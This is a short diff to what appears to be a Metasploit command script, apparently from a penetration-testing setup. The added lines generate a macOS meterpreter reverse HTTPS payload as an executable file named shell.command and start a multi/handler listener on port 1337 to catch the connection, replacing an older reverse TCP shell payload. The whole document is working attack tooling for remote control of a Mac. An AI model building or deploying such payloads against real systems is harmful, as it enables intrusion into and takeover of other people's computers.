@@ -1,2 +1,8 @@
+use payload/osx/x64/meterpreter_reverse_https
+set lport 1337
+generate -f macho -o /pentest/Desktop/shell.command
+chmod +x /pentest/Desktop/shell.command
 use multi/handler
-set payload osx/x86/shell_reverse_tcp  
+set payload osx/x64/meterpreter_reverse_https
+set lport 1337
+exploit -j
